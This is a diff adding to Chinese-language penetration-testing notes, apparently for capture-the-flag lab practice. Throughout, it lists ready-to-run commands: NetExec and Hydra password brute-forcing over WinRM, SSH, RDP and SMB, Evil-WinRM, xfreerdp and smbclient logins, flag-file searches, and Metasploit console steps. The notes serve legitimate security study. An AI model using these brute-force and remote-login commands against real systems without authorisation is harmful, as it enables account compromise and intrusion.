@@ -87,18 +87,42 @@ NetExec
 支持 NFS、FTP、SSH、WinRM、SMB、WMI、RDP、MSSQL、LDAP 和 VNC
   https://github.com/Pennyw0rth/NetExec
 用法  netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
+netexec winrm 10.129.42.197 -u user.list -p password.list
+netexec smb 10.129.42.197 -u "user" -p "password" --shares
 
+
+Evil-WinRM
+支持 WinRM
   https://github.com/Hackplayers/evil-winrm
+用法  evil-winrm -i <target-IP> -u <username> -p <password>
+evil-winrm -i 10.129.42.197 -u user -p password
+Get-ChildItem -Path ., .. -Recurse -Filter "flag*"            PowerShell 搜索含 ‘flag’ 文件名      Bash 语法：find . .. -type f -name 'flag*' 2>/dev/null
+type C:\Users\john\Desktop\flag.txt                           查看 flag
 
-  https://github.com/Pennyw0rth/NetExec
-  NFS、FTP、SSH、SMB、WMI、RDP、MSSQL、LDAP、VNC, as well
+
+Hydra
+支持 SSH、RDP、SMB
+hydra -L user.list -P password.list ssh://10.129.42.197
+hydra -L user.list -P password.list rdp://10.129.42.197
+hydra -L user.list -P password.list smb://10.129.42.197
+
+xfreerdp
+登录RDP
+用法  xfreerdp /v:10.129.42.197 /u:user /p:password
+
+smbclient
+登录SMB
+smbclient -U user \\\\10.129.42.197\\SHARENAME
+get flag.txt      下载 flag
 
 
-SSH、RDP、SMB:
-  Hydra
-
-  xfreerdp to connect
-  smbclient to connect
+MSF
+msfconsole -q
+> search
+> use
+> options
+> set
+> run
 
 
 Password spraying:
